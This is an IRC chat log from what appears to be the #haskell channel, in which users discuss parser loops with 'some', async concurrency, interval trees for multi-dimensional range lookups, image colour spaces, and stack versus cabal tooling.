03:21:15 <pycer> Geekingfrog: one ques. i have this file HaskellPlatform-8.0.1-full-x86_64-setup.exe..am i good to go?
03:22:36 <Geekingfrog> I'm not on windows and I've never used the haskell platform, so I don't know :/ But it looks like a good start.
03:27:58 <ph88> Geekingfrog, i tried haskell platform, stack is better
03:28:43 <Geekingfrog> Yeah, that's what I use as well.
03:48:43 <dbeacham_> is there a best jumping off point for understanding the ad library - easiest way to get to grips with types/modes and papers that the implementation might closely follow? Mostly want to dig through reverse mode implementations.
04:00:13 <ski> dbeacham_ : mayhaps "Functional Differentiation of Computer Programs" by Jerzy Karczmarczuk in 2001 at <https://karczmarczuk.users.greyc.fr/arpap/> could be interesting ..
04:11:05 <jchia_1> How can I define foo in a more abstract and succinct way? http://lpaste.net/351664
04:12:00 <jchia_1> L5 and L6 are the same if I flip x <-> y at the right places
04:12:37 <jchia_1> I mean L4 & L5
04:13:22 <jchia_1> (Just edited and removed a line)
04:23:43 <jchia_1> I found the answer. g f x = swap . f x . swap
04:24:38 <dbeacham_> ski: thanks! I'll have a read and compare
04:44:11 <ertes> does anyone know how to find out the colour space of an image with JuicyPixels?
04:45:04 <ertes> or alternatively: make it return an image in a certain colour space
04:47:31 <hpc> https://hackage.haskell.org/package/JuicyPixels-util-0.2/docs/Codec-Picture-RGBA8.html perhaps
04:47:39 <MarcelineVQ> color space? like an ICC?
04:47:53 <hpc> fromDynamicImage, though it specifically makes it RGBA8
04:48:56 <hpc> ertes: if you can somehow find a good function between color spaces, pixelMap from JuicyPixels as well lets you convert them
04:49:17 <hpc> oh wait you don't even need that other package either, convertRGBA8
04:50:29 <hpc> ooh, https://hackage.haskell.org/package/JuicyPixels-3.2.8/docs/Codec-Picture-Types.html#t:ColorConvertible
04:50:33 <ertes> hpc: the problem is: i don't know the colour space to begin with
04:50:43 <ertes> hpc: sRGB?  adobe RGB?  …?
04:50:45 <hpc> so you have DynamicImage
04:51:11 <ertes> hpc: i understand JuicyPixels' API…  the problem is that it doesn't seem to give me this information
04:51:25 <ertes> "RGB" can mean a lot of things
04:52:02 <hpc> juicy doesn't seem to have a concept of the sRGB space...
04:52:21 <hpc> terrible idea: use imagemagick
04:52:34 <ertes> i think it just loads the component values without even caring about what they mean =/
04:52:55 <MarcelineVQ> it does have gamma metadata, at a glance
04:52:56 <ertes> i should probably report this as a bug, because without this information one can't even write a correct image viewer
04:53:38 <MarcelineVQ> isn't gamma and colorspace often interchangeable terms?
04:53:40 <ertes> MarcelineVQ: yeah, i found that, too, but couldn't really tell whether or how i could use it
04:54:03 <ertes> MarcelineVQ: no, because you also need a reference point
04:54:57 <ertes> in fact most images are encoded in non-linear sRGB, and gamma does not account for this at all
05:00:52 <hpc> imagemagick is looking more and more like a real suggestion :/
05:01:18 <hpc> and yeah, srgba doesn't correspond to any gamma value: http://www.imagemagick.org/Usage/color_basics/#perception
05:05:37 <Tuplanolla> Is working with sockets supposed to be painful?
05:06:11 <hpc> are you listening or connecting?
05:06:30 <Tuplanolla> I'm using `listen` and `accept`.
05:07:12 <Tuplanolla> Exceptions are flying everywhere.
05:08:52 <hpc> ah
05:09:18 <hpc> what exceptions?
05:09:27 <ph88> does anyone know why this parser code seems to loop forever? https://paste.fedoraproject.org/536940/14854361/  I expect DF [DU (CC [])] to be returned for empty input ""
05:09:37 <ertes> Tuplanolla: fortunately haskell lets you use sockets in a sequential manner: just use concurrency
05:10:14 <ertes> Tuplanolla: when the thread quits, consider this a closed connection, when it throws an exception, consider it a connection reset…  that distinction is sufficient for 99% of all applications
05:10:24 <ertes> Tuplanolla: the async library makes this particularly easy
05:10:34 <Tuplanolla> Perhaps I shouldn't be reading these man pages too closely.
05:11:21 <hpc> also even though it's discouraged for new users, https://hackage.haskell.org/package/network-2.6.3.1/docs/Network.html#g:3 is actually much easier to use
05:12:10 <ertes> just use something like pipes-network
05:12:16 <ertes> it uses the proper socket API
05:12:42 <hpc> ah good call
05:13:32 <Tuplanolla> Right now I have a main thread and two threads per connection that all share a channel.
05:14:06 <Tuplanolla> It's working fine, but I have this C programmer's paranoia that I forgot to handle a failure mode somewhere.
05:14:28 <MarcelineVQ> ph88: what version of megaparsec is this?
05:16:29 <MarcelineVQ> oh I see new
05:20:01 <ertes> Tuplanolla: worst case: your thread dies
05:20:25 <ertes> Tuplanolla: that's why you should really use async, because threads die silently (from the perspective of your application) by default
05:20:43 <ertes> Tuplanolla: then you can listen on both the channel *and* the thread result using STM
05:20:47 <ertes> Tuplanolla: see waitSTM
05:20:55 <Tuplanolla> Let's take a look.
05:21:00 <Tuplanolla> @hackage async
05:21:01 <lambdabot> http://hackage.haskell.org/package/async
05:22:28 <Tuplanolla> I shall try this. Thanks for the suggestion.
05:23:09 <ertes> Tuplanolla: here is the idiom i typically use: join (atomically (doSomethingWithNextValue <$> readTQueue q <|> either handleConnLost handleConnQuit <$> waitSTM a))
05:25:05 <Tuplanolla> What does it do?
05:25:24 <ertes> doSomethingWithNextValue :: ChanValue -> IO r
05:25:30 <ertes> handleConnLost :: SomeException -> IO r
05:25:45 <ertes> handleConnQuit :: YourThreadResultType -> IO r
05:26:21 <ertes> if there is something on the queue, the first one is run, if the thread died, the second one, if the thread returned normally, the third one
05:26:45 <Tuplanolla> ...and `a`?
05:26:59 <ertes> the value 'a' came (ideally) from withAsync
05:27:04 <ertes> less ideally from 'async'
05:27:11 <Tuplanolla> Right.
05:27:29 <ertes> it's of type (Async YourThreadResultType)
05:42:44 <merijn> Ok, I need to develop a trivial GUI that involves 1) sliders, 2) checkboxes and 3) a canvas on which I can draw rectangles interactivel. Recommended libraries?
05:45:58 <opqdonut> merijn: browser?
05:46:25 <merijn> opqdonut: If need be
05:46:30 <MarcelineVQ> I'd probably try webkit yeah
05:46:39 <merijn> OpenGL/SDL makes the drawing easy, but the sliders a pain
05:47:08 <merijn> browser means I now have to figure out how to get my data onto a website and deal with webdev which I've avoided for years :p
05:48:28 <merijn> But if anyone has recommendations for Haskell tools to do it in the browser I'm open to recommendations
05:48:51 <MarcelineVQ> reflex-dom with webkit compiles to a native app or a website
05:48:57 <MarcelineVQ> it's pretty neat
06:00:42 <ph88> MarcelineVQ, megaparsec-5.1.2
06:01:37 <jchia_1> I'm using stack and need to do space profiling to track a space leak. There are options --library-profiling and --executable-profiling that I can use, but when I do that, stack rebuilds all the hackage packages, not just my own packages. Is there a way to target the profiling compilation to my own library & executable?
06:02:17 <ph88> jchia_1, this is normal that all packages are rebuild in debug mode .. but it should only happen once for each package
06:02:20 <merijn> MarcelineVQ: Looks like I need a lot of work with Nix and ghcjs to get that working :\
06:02:33 <ph88> merijn, purescript? :D
06:03:15 <MarcelineVQ> merijn: not a lot, there's a drop-in shell available with reflex iirc
06:03:18 <MarcelineVQ> you just load it and you're done
06:04:54 <merijn> MarcelineVQ: The reflex docs at least, are rather vague about what exactly they'll do and install...
06:04:56 <codedmart> I have a web server and I want to process a task in the background so it doesn't block, but I don't feel like I need a job queue system just yet. Would I use forkIO?
06:05:07 <quchen> jchia_1: sit it out :-/
06:05:51 <quchen> codedmart: If your task is supposed to finish eventually, use async
06:05:56 <sshine> I'm looking at Data.Trie, which works on ByteStrings, and I want to make a dictionary lookup on a list of unicode strings. something tells me it'd be really neat if there were a trie that supported Data.Text?
06:06:03 <MarcelineVQ> merijn: well you could scroll through the nix script if you're worried, I don't know nix stuff myself so that's about as helpful as I can be :o
06:06:09 <codedmart> quchen: Ah ok cool thanks!
06:06:43 <quchen> codedmart: Async should be our go-to library for anything concurrent, unless we have more specific requirements
06:06:49 <quchen> forkIO is not a good default for this
06:07:03 <quchen> (Async is a safe wrapper around forkIO for the most part)
06:07:03 <merijn> MarcelineVQ: I don't know Nix either and would prefer not too ;)
06:07:54 <merijn> sshine: I don't think there is, sadly, but you could just encode your Text to ByteString when inserting/retrieving?
06:08:05 <MarcelineVQ> Cale could possibly be more convincing about the subject since he uses that shell script daily
06:08:59 <jchia_1> Is it normal to get a segfault instead of the RTS complaining about running out of memory when there's a space leak?
06:08:59 <MarcelineVQ> Allthough, I think he's said in the past he leaves worrying about what nix is doing to others too :>
06:09:11 <codedmart> quchen: I am not really running two operations though. Just one but I don't want it to block.
06:11:17 <sshine> merijn, I thought that maybe I should try and make this package and find a mentor for assuring the quality.
06:14:12 <raduom> why does data TApp f a = MkTApp (f a) have hind (* -> *) -> * -> * ?
06:15:36 <quchen> :t \f a -> f a
06:15:38 <lambdabot> (t -> t1) -> t -> t1
06:15:42 <quchen> Same thing on the value level
06:16:34 <quchen> raduom: ^
06:17:01 <codedmart> Let's say I want to run a job queue. Any recommened existing packages to use?
06:17:01 <quchen> More verbosely, »data TApp f a« gives you »f : k« and »a : l«.
06:17:37 <quchen> raduom: Since »f a« has to kind-check, f has to have kind »l -> m«.
06:17:44 <raduom> quchen: i think i see it. since (f a) is on the right side it is assumed to be a function of type a -> ? and since it also has the a argument in the left it would be a function that takes one more type and results in the final thing.
06:18:03 <ph88> does anyone know why this parser code seems to loop forever? https://paste.fedoraproject.org/537002/48544022/
06:18:10 <quchen> So that gives us »TApp : (l -> m) -> l -> m
06:18:12 <quchen> «
06:18:23 <quchen> Since TApp should be an inhabited type, m has to be *
06:18:34 <quchen> This gives us TApp : (l -> *) -> l -> *
06:18:51 <quchen> If you enable PolyKinds, that’s probably what GHC would infer on its own.
06:19:21 <raduom> yes. the polykinds paper puzzled me :)
06:19:26 <raduom> thanks. moving on.. :)
06:20:34 <raduom> inhabited type = have kind *?
06:20:38 <merijn> And not quite related to my original question: Suppose I have key-value pairs where my keys are multi-dimensional ranges, what would be a good data structure for storing them if I want to look them up by dimension?
06:21:05 <merijn> raduom: Yes, all types that are inhabited (i.e., have values), must be of kind *
06:21:37 <raduom> merijn: i know postgres uses GIST indexes for geographical data :D
06:21:51 <quchen> All inhabited types have kind *.
06:22:06 <quchen> Not all types of kind * are inhabited: Void has kind *, but no values.
06:22:20 <merijn> quchen: Eh, yes it does
06:22:26 <quchen> Noooo
06:22:36 <merijn> quchen: You forgot we don't live in total candyland :)
06:22:50 <quchen> Sure I do
06:23:00 <raduom> merijn bottom?
06:23:12 <quchen> Me and my morally correct star-kinded things
06:23:17 <merijn> raduom: Yes :)
06:23:18 <raduom> that came out bad :P
06:43:08 <merijn> I'm seriously considering just storing this in SQLite and maybe just writing SQL queries, that might be simpler...
06:46:25 <raduom> merijn aren't kd trees used to store that?
06:54:17 <wz1000> merijn: Wouldn't something like a quadtree do?
06:54:35 <merijn> wz1000: quadtrees only deal with 2 dimensional non-overlapping positions
06:55:06 <wz1000> merijn: You can extend them to 3 dimensions
06:55:34 <opqdonut> octtrees
06:55:34 <wz1000> have 2^n branches
06:55:56 <wz1000> where n is the number of dimensions
06:56:08 <merijn> wz1000: Right, but I need 8+ dimensions with overlapping ranges :)
06:56:13 <opqdonut> or have a binary tree and separating hyperplanes
06:56:23 <merijn> opqdonut: Tell me more :)
06:57:00 <Jinxit> kd-trees is the generalized version
06:57:20 <Jinxit> oh they were already mentioned
06:57:34 <merijn> I don't think kd-trees are appropriate, since I don't have discrete values but ranges
06:57:35 <opqdonut> is your stuff axis aligned? then just pick an axis and a threshold per node, and split the data into parts where axis<threshold and axis>threshold
06:57:47 <opqdonut> hmm I didn't see your original problem
06:58:02 <Jinxit> oh ranges hmm
06:58:28 <Jinxit> so you want to see if it's inside a cuboid basically?
06:58:33 <Jinxit> in whatever dimensionality
06:58:45 <merijn> opqdonut: Problem is I have N dimension and I have key-value pairs where the key consists of N ranges (i.e. one range per dimension) which is just a "min" and "max" value
06:58:48 <opqdonut> sticking startx, endx, starty, endy, ..., in sql sounds like a good starting point actually
06:59:15 <merijn> opqdonut: I want to be able to do things like "give me all keys where the nth dimensions range includes value X'
06:59:26 <opqdonut> yeah
06:59:39 <opqdonut> for a custom datastructure approach, build an interval tree per dimension
06:59:44 <merijn> Bonus points if I can easily generalise it to multiple values of N
06:59:45 <Jinxit> still feels like something kd-tree-like is the proper solution
06:59:53 <opqdonut> > an interval tree is a tree data structure to hold intervals. Specifically, it allows one to efficiently find all intervals that overlap with any given interval or point
06:59:56 <lambdabot>  <hint>:1:28: error: parse error on input ‘data’
07:00:03 <Jinxit> yeah that sounds right
07:00:07 <opqdonut> oops, shouldn't use > as a quote here
07:03:27 <wz1000> merijn: How about an interval tree or a segment tree?
07:04:09 <opqdonut> wz1000: yeah, interval tree per dimension is the right thing based on his description
07:05:12 <merijn> wz1000: I need to look up how those work to see if it works :)
07:05:31 <merijn> opqdonut: I'm not sure if it's possible to make an interval tree per dimension work?
07:05:41 <opqdonut> merijn: "an interval tree is a tree data structure to hold intervals. Specifically, it allows one to efficiently find all intervals that overlap with any given interval or point"
07:06:36 <opqdonut> merijn: so I was thinking about something like have the data in an array, and have the interval trees be indexes on top of it. so the vals in the interval trees are indexes to the array
07:06:42 <merijn> oh, I suppose that could work if you then do an intersection after looking up in each tree
07:06:59 <Jinxit> and if any fail on the way, bail out
07:07:12 <opqdonut> right, you need intersections, then interval trees won't be optimal, but probably good enough
07:08:00 <cobreadmonster> Is ghc applying for gsoc?
07:08:35 <merijn> cobreadmonster: Probably, they've been part of gsoc almost every year (except last, I think? but last year other sponsors stepped in)
07:08:49 <cobreadmonster> merijn: Would you supervise my gsoc?
07:08:56 <cobreadmonster> I want to do something interesting.
07:09:06 <wz1000> cobreadmonster: Yes, they've applied. I just asked sclv yesterday.
07:09:53 <merijn> cobreadmonster: I don't really work on GHC except like 3 minor patches I wrote, plus I don't have the time for that :)
07:10:10 <cobreadmonster> merijn: I wanted to do something academic :(
07:10:19 <cobreadmonster> and yeah, I know you don't have much time.
07:10:53 <merijn> cobreadmonster: Try emailing ghc-devs, I'm sure there's people who can supervise :)
07:14:19 <merijn> opqdonut: hmmm, looks like SQLite actually has builtin support for range queries, so rather than implementing/searching for a interval tree interpretation I might just use that one
07:18:47 <jchia_1> I've previously built my app with "stack build" using --library-profiling --executable-profiling. Now that I'm done profiling, I want to build a regular executable without any profiling slowdown, but when I "stack build" without those options, no new compilation happens and I still get the original slow binary. Is there something better I can do than using "stack clean" before "stack build"?
07:23:18 <ph88> i made this parser which seems to loop forever and i can't figure out why, anyone want to have a look?  https://paste.fedoraproject.org/537002/48544022/
07:24:56 <phadej> ph88: p_C accepts empty string, and you "some" it
07:25:20 <phadej> some of empty string is infinitely many, and no input is consumed
07:26:25 <ph88> but the parser should still return  CC []
07:26:44 <ph88> because it could match empty string
07:27:19 <phadej> that one does, but DF[DU (CC []), DU (CC []), DU (CC []), ...]
07:27:32 <phadej> but the p_A returns that
07:27:33 <ph88> i didn't even know many is monitoring how much input is consumed o_O i thought the argument parser just had to succeed for many to succeed
07:27:54 <quchen> jchia_1: Try --no-library-profiling maybe?
07:28:24 <phadej> (or would)
07:29:08 <ph88> phadej, p_A only has to return one  DU (CC [])  for some to succeed, no ?
07:29:28 <merijn> ph88: some will return *as many as it can*
07:29:40 <merijn> ph88: Since it consumes no input, as many as it can is infinite
07:30:06 <ph88> in this case i expect it to return 1 of  DU (CC [])
07:30:22 <phadej> :source some
07:30:32 <ph88> @src some
07:30:32 <lambdabot> some v = some_v
07:30:32 <lambdabot>   where many_v = some_v <|> pure []
07:30:32 <lambdabot>         some_v = (:) <$> v <*> many_v
07:30:45 <merijn> ph88: Why do you expect it to stop? It never fails
07:31:07 <merijn> ph88: "some p" parses as many 'p' as it can, until 'p' fails
07:31:15 <merijn> ph88: If 'p' never fails, some never stops parsing
07:31:22 <ph88> oh right that's why it keeps looping -___-
07:31:44 <jchia_1> quchen: It doesn't work. I can still give profiling RTS flags.
07:36:41 <ph88> merijn, this is just so hard to debug in large grammars, do you have any hints ?
07:37:32 <merijn> ph88: tbh, I've never written parsers that don't consume input, I don't quite see what the point of that would be?
07:39:43 <phadej> iirc `parsec` throws exception if you do many (many $ char 'a') for example
07:39:52 <phadej> i.e. it tracks whether parsers consumes any input or doesn't
07:40:26 <phadej> you can avoid the check by writing recursion manually, so it's not fail proof, but still...
07:40:54 <phadej> not sure if megaparsec removed that (and why)
07:42:00 <ph88> merijn, in development i don't want to write the entire grammar at once. I want to split off sub-tree of the grammar. So it happens often that there are parsers that don't consume input
07:42:31 <merijn> ph88: Looks like you're writing top down, though. I would recommend writing your grammars bottom up
07:42:46 <merijn> That way you always have bits that consume input for testing
07:43:01 <ph88> merijn, yes it's true i wrote top-down :/
07:43:34 <maerwald> the stuff at the bottom is sometimes the most annoying though
07:43:46 <maerwald> (e.g. in SQL)
07:43:50 <ph88> there is nothing warning me if i write a parser that doesn't consume input
07:51:05 <kadoban> ph88: Should there be?
07:52:39 <ph88> would be a massive help during development
07:53:28 <kadoban> Not sure how ... what parsers are you writing that accidentally don't consume input?
07:53:37 <kadoban> I just don't think I've ever run into that.
07:58:43 <Zemyla> Okay, if I have something like traverseWithKey :: Applicative f => (k -> a -> f b) -> t k a -> f (t k b), then how do I turn it into an IndexedTraversal?
08:01:42 <phadej> Zemyla: http://hackage.haskell.org/package/lens-4.15.1/docs/src/Control.Lens.Indexed.html#line-712
08:01:54 <phadej> if i'm not wrong, your type is IndexedTraversal
08:02:17 <phadej> ah now, it's itraverse, not itraversed
08:02:32 <phadej> itraversed = conjoined traverse (itraverse . indexed)
08:12:15 <wz1000> How do you people feel about a syntactical change to instance declaration that allows multiple classes to be instantiated together?
08:12:58 <wz1000> Eg: allow instance (Eq Foo, Ord Foo) where compare = ...; (==) = ...
08:13:18 <merijn> wz1000: What would the point of that be?
08:13:28 <Tuplanolla> It seems like a hassle without much benefit, wz1000.
08:13:53 <wz1000> merijn: Allowing the breakup of already existing typeclasses
08:14:19 <merijn> wz1000: Which one would you like to breakup? And how would it allow that?
08:14:29 <wz1000> For example, type Num a = (Additive a, Subtractive a, Multiplicative a)
08:15:04 <Tuplanolla> Oh, it's a migration plan.
08:16:03 <wz1000> Also, Applicative could have been introduced as type Applicative a = (Pointed a, FunApp a)
08:16:08 <Zemyla> Okay, this is a problem.
08:16:10 <Zemyla> @let import qualified Numeric.Natural as N
08:16:12 <lambdabot>  Defined.
08:16:14 <Zemyla> > clearBit (7 :: N.Natural) 2
08:16:17 <lambdabot>  *Exception: Bits.complement: Natural complement undefined
08:17:30 <wz1000> then Monad could have been redefined as type Monad a = (Pointed a, Joinable a) where FunApp is a superclass of Joinable
08:17:59 <phadej> wz1000: FYI, Apply and Bind in https://hackage.haskell.org/package/semigroupoids
08:21:09 <merijn> wz1000: But most of those classes have no laws
08:21:23 <merijn> wz1000: Which defeats your ability to reason about what they do
08:21:32 <merijn> wz1000: Pointed is bad for the same reason Default is bad
08:22:05 <phadej> merijn: but Apply f => Applicative f would be an "improvement"
08:23:53 <tabaqui1> signatures of foldlWithKey and foldrWithKey in Data.IntMap are really confusing
08:24:06 <tabaqui1> foldrWithKey :: (Key -> a -> b -> b) -> b -> IntMap a -> b 
08:24:10 <wz1000> merijn: Pointed has fmap f . point = point . f
08:24:12 <tabaqui1> foldlWithKey :: (a -> Key -> b -> a) -> a -> IntMap b -> a 
08:25:11 <tabaqui1> Data.Map has the same
08:25:56 <phadej> wz1000: it's a free theorem
08:26:07 <phadej> wz1000: you cannot break it, with non GADTs
08:26:36 <phadej> e.g. both Just and const Nothing "work"
08:27:27 <wz1000> phadej: Ah
08:29:02 <phadej> (not sure, probably you won't have lawful Functor, if you can break it)
08:32:37 <ph88> that TH breaks up your file is so unfortunate :
08:32:40 <ph88> :
08:32:43 <ph88> :'(
08:34:43 <wz1000> tabaqui1: Would it be better if foldr was ((Key, a) -> b -> b) -> b -> IntMap a -> b
08:35:01 <wz1000> s/foldr/foldrWithKey
08:37:21 <tabaqui1> wz1000: nope, it would be better if both functions deal with "IntMap a"
08:37:53 <tabaqui1> maybe a little better if Key always was the first argument of incoming function
08:39:54 <wz1000> tabaqui1: That wouldn't make sense. The current type signature is obtained by taking the type signature of the original fold and replacing a with (Key, a) and currying the final signature
08:40:32 <wz1000> foldr :: (a -> b -> b) -> b -> IntMap a -> b
08:40:59 <wz1000> foldrWithKey' :: ((Key, a) -> b -> b) -> b -> IntMap a -> b
08:41:16 <wz1000> foldrWithKey :: (Key -> a -> b -> b) -> b -> IntMap a -> b
08:41:17 <tabaqui1> wz1000: ah, yeah, right
08:41:37 <tabaqui1> it's fold functions are confusing then
08:56:03 <zipper> What is the greatest liftA* ?
08:56:20 <glguy> zipper: You can use tab-completion in GHCi to answer that
08:56:31 <zipper> glguy: Oh
08:56:44 <zipper> Got it :)
08:56:50 <zipper> Random thought
08:57:14 <taliriktug> Hi! Question: should ":info (:)" really display two identical strings? I tried to find it in ghc sources, but failed.
08:57:25 <taliriktug> > :info (:)
08:57:27 <lambdabot>  <hint>:1:1: error: parse error on input ‘:’
08:57:34 <taliriktug> oh, ok
08:57:37 <wz1000> zipper: IIRC, there are more liftMs than liftAs
08:57:42 <merijn> taliriktug: That's an...odd issue
08:57:51 <merijn> taliriktug: I get the same here, but I have no clue why
08:58:15 <glguy> What's the specific issue?
08:58:33 <taliriktug> merijn: Can it be some bug with parsing documentation or something (has no idea where ghci takes info)
08:58:41 <merijn> taliriktug: No idea, tbh
08:58:50 <merijn> glguy: ":i (:)" prints the same text twice
08:58:58 <merijn> 7.10.1 for me
08:58:58 <zipper> I don't get two identical strings
08:59:04 <lpaste> glguy pasted “:info (:)” at http://lpaste.net/8597764141286948864
08:59:20 <taliriktug> I have 7.10.3
08:59:31 <wz1000> merijn taliriktug: I only get it once with 8.0.1
08:59:43 <zipper> glguy: I don't see two strings there
08:59:48 <lpaste> merijn pasted “Double output” at http://lpaste.net/8842925770805346304
08:59:56 <merijn> Maybe it's fixed in GHC 8?
09:00:01 <glguy> Probably just one of the many bugs fixed since that version
09:00:03 <taliriktug> yeah, probably
09:00:14 <merijn> Doesn't seem like a critical problem, imo :p
09:00:53 <zipper> merijn: Haskellers love to nitpick!
09:01:32 <merijn> to be fair, it is odd
09:01:46 <discodiddler> today I had to edit some elixir code, and realised I didn't know the return type of a function, and missed haskell again :(
09:01:47 <taliriktug> actually it was discovered in a course on Haskell basics
09:02:09 <taliriktug> we were told about (:) and someone tried to look at the info
09:02:54 <taliriktug> I replied that it is fixed. Thanks =)
09:03:47 <zipper> discodiddler: I always add type annotations in my clj(s) code lol
09:04:05 <zipper> taliriktug: :)
09:04:38 <discodiddler> zipper: problem with that is you can't know they're actually true
09:04:41 <wz1000> That reminds me of one of the reasons I hate ghci
09:04:48 <wz1000> :i doesn't show documentation
09:05:18 <Tuplanolla> We're still lacking colors and integrated documentation, which is a shame.
09:06:46 <zipper> discodiddler: True
09:07:10 <zipper> Plus people always delete them because they make no sense to them or they are well useful only to me
09:07:26 <srwog2nd1> set *message
09:54:04 <kebolio> hiya, what's the nicest http client library that isn't wreq and does http transparently? don't like lenses
09:54:42 <c_wraith> wreq is built on http-client, iirc
09:55:15 <johnw> kebolio: what's your use case?
10:00:17 <kebolio> johnw: in this case, for a toy web api client
10:00:27 <kebolio> just to get a taste of using the lang for something
10:01:56 <sm> how about http://hackage.haskell.org/package/download
10:02:32 <sm> http://hackage.haskell.org/package/req is newer but a little scarier
10:02:40 <kebolio> hmm
10:02:52 <kebolio> popping out, shall check those out later. cheers
10:07:14 <sm> download looks like the simple-api winner.. but is built on a bunch of c code, so less portable. https support unknown
10:08:07 <sm> I'm going with req
10:12:21 <Cale> kebolio: Recently I've just stuck to using http-client.
10:13:41 <Cale> You don't have to use very much of the library just to make a simple request and examine the response
10:19:24 <biglambda> Quick question: I need adjust a value x so that it’s the nearest multiple of y to the value that is either equal to or greater than so I’m using: let adjusted x multiple = ((x + multiple - 1) `div` multiple) * multiple , is there a standard function that does this?
10:21:23 <phadej> > let x = 11; y = 5 in x - x `mod` y
10:21:25 <lambdabot>  10
10:21:28 <phadej> would be equal or less
10:21:33 <phadej> and you want equal or greater?
10:21:44 <biglambda> Hold on :)
10:22:11 <biglambda> Checking
10:22:12 <phadej> e.g. 'ceil', not 'floor'?
10:22:26 <phadej> "kind of"
10:23:22 <biglambda> I need equal to or greater
10:23:59 <biglambda> I’m fitting the dimensions of an arbitrary bitmap onto tiles that are an optimum size.
10:24:12 <glguy> > let adjusted multiple x = x + (-x)`mod`multiple in map (adjusted 4) [1..10]
10:24:14 <lambdabot>  [4,4,4,4,8,8,8,8,12,12]
10:24:59 <phadej> that seems to work?
10:25:03 <biglambda> let adjusted x multiple = ((x + multiple - 1) `div` multiple) * multiple
10:25:27 <biglambda> adjusted x multiple = ((x + multiple - 1) `div` multiple) * multiple in map (adjusted 4) [1..20]
10:25:39 <biglambda> let adjusted x multiple = ((x + multiple - 1) `div` multiple) * multiple in map (adjusted 4) [1..20]
10:25:58 <glguy> biglambda: Your example is varying the multiples, not the value being "adjusted"
10:26:18 <biglambda> >  let adjusted x multiple = ((x + multiple - 1) `div` multiple) * multiple in map (\ x -> adjusted x 4) [1..20]
10:26:20 <lambdabot>  [4,4,4,4,8,8,8,8,12,12,12,12,16,16,16,16,20,20,20,20]
10:26:39 <biglambda> Ok, it’s the same result
10:27:05 <biglambda> Just curious if there was a standard function I was missing.
10:34:46 <jarlg> Is there a standard function like `whenM :: m Bool -> m () -> m ()` ? Why / why not?
10:39:42 <niklasb> jarlg: you could just do value >>= flip when
10:40:02 <niklasb> but yeah, there is such a function in MonadUtils
10:42:13 <jarlg> niklasb: Thanks! (I know -- mostly wondering where I should look for utils outside Control.Monad. Hoogle didn't help.)
10:42:56 <niklasb> well it did for me: https://www.stackage.org/lts-7.17/hoogle?q=whenM
10:43:23 <dram_phone> @where hoogle
10:43:24 <lambdabot> http://haskell.org/hoogle http://fpcomplete.com/hoogle – See also Hayoo, which searches more packages: http://hayoo.fh-wedel.de/
10:43:49 <fragamus> hey im having some difficulty setting up a Turtle script that is intended to monitor a directory - I want to use (ls "some dir") to generate a stream of Turtle.Filpath   that works great. BUT...
10:44:54 <jarlg> niklasb: The haskell.org hoogle doesn't show anything... Seems stackage is more up to date. This fragmentation is confusing me..
10:45:23 <fragamus> I am just using view to print the stream. What I need is to open each file, and read one line from it, and do some stuff with that line
10:45:39 <lyxia> haskell.org/hoogle should be obsolete
10:47:37 <fragamus> I am figuring it out. Asking the question helped.
10:47:40 <dram_phone> http://hoogle.haskell.org is more up-to-date
10:47:49 <dram_phone> But yeah just use stackage
10:48:09 <dram_phone> Basically everyone is using stack these days right?
10:48:22 <geekosaur> of course, nything else is defined as Satan
10:48:31 <geekosaur> do not dare to think of anything else
10:49:13 <jarlg> Personally I'm finding stack integration with Nix quite buggy. Having a better time with cabal+nix.
10:49:56 * geekosaur is not especially impressed with stack anbd even less impressed with stack-is-GOD people insisting EVERYTHING MUST BE STACK NOW AND FOREVE
10:52:28 <glguy> dram_phone: In lowercase letters, no, it's not the case that basically everyone is using stack these days
10:52:53 <dram_phone> uh, sorry
10:53:42 <dram_phone> sorry about that..
10:54:24 <scav> How about making up your own opinion on these things?
10:54:42 <bitemyapp> use both, decide for yourself
10:54:53 <bitemyapp> but I will say that it's sort of pain-that-I'm-used-to thing
10:55:10 <bitemyapp> When Stack came out I was a bit wary because from my POV, sandboxes had "fixed the problems"
10:55:10 <scav> You managed to decide on Haskell, you are already ahead of the curve. Surely you are able to decide on a toolseT?
10:55:32 <bitemyapp> if you don't work with or aren't a beginner yourself, it's hard to see the thousand papercuts that remain even with sandboxes.
10:55:38 <MarcelineVQ> no reason to be exclusive even then :>
10:55:44 <bitemyapp> and no, new-build doesn't really cover it.
10:56:05 <bitemyapp> I know a _lot_ of people that are only using Haskell because of how easy Stack made juggling package snapshots and GHC versions.
10:56:34 <electrocat> hiya, quick question, is there a reason why main is of type 'IO a' and not 'IO ()'. I can do 'main = return 5', which doesn't do anything useful. Is the return value of main just ignored?
10:56:36 <bitemyapp> prior to Stack I was using hvr's GHC PPA and sandboxes and that was pretty okay! but I still had to blow away sandboxes on the reg and switching over to profiling libraries was annoying.
10:57:13 <davean> Yah, not tracking the profiling flag was a huge mistake cabal made
10:57:22 <shapr> electrocat: ooh, I don't know! but now I want to
10:57:24 <davean> though stack directly interfears with what I do on a daily basis
10:57:34 <davean> its not nearly as flexable a tool
10:58:23 <bitemyapp> you're an expert user and understand everything well enough to know how to fix things when they get in a broken/stuck state.
10:58:32 <bitemyapp> e.g. like blowing away a package db
10:58:39 <davean> I haven't done that in nearly a year
10:58:45 <bitemyapp> are you using nix?
10:58:47 <davean> No
10:58:52 <bitemyapp> well, good for you
10:59:00 <davean> cabal solved all the things that caused that to be required for me
10:59:02 <bitemyapp> but if you churn package versions on the reg, it happens often enough.
10:59:06 <shapr> put up a PR for "stack repair" that blows away package db and dirs?
10:59:09 <davean> Nah, the tracking fixed that
10:59:15 <bitemyapp> shapr: I'm not talking about Stack
10:59:19 <shapr> oh, sorry
10:59:23 <bitemyapp> I'm not just talking about what happened to me, I'm talking about what other people got stuck on.
10:59:30 <davean> bitemyapp: I'm not sure what could make that required these days
10:59:34 <bitemyapp> it happened pretty regularly until people started using Stack.
11:00:01 <davean> bitemyapp: yah, but cabal fixed the bugs that caused it in all the cases I can think of
11:00:05 <MarcelineVQ> electrocat: correct, it's discarded. possibly it's IO a because there's no good reason to be more restrictive
11:00:14 <davean> bitemyapp: they were flat out bugs
11:00:25 --- mode: ChanServ set +o glguy
11:00:25 --- mode: glguy set +b vapid!*@*
11:00:25 --- kick: vapid was kicked by glguy (still banned)
11:00:34 <electrocat> MarcelineVQ: ah ok, so it's just for convenience?
11:00:51 <shapr> My coworkers can't deal with raw cabal, stack means they will actually install my program.
11:00:54 <shapr> I'm a fan.
11:00:57 <davean> bitemyapp: do you know how one might get into such an error condition any more?
11:01:10 --- mode: glguy set -bb vapid!*@* *!*@85.255.13.137
11:01:35 <davean> The closest I can think of is a custom setup
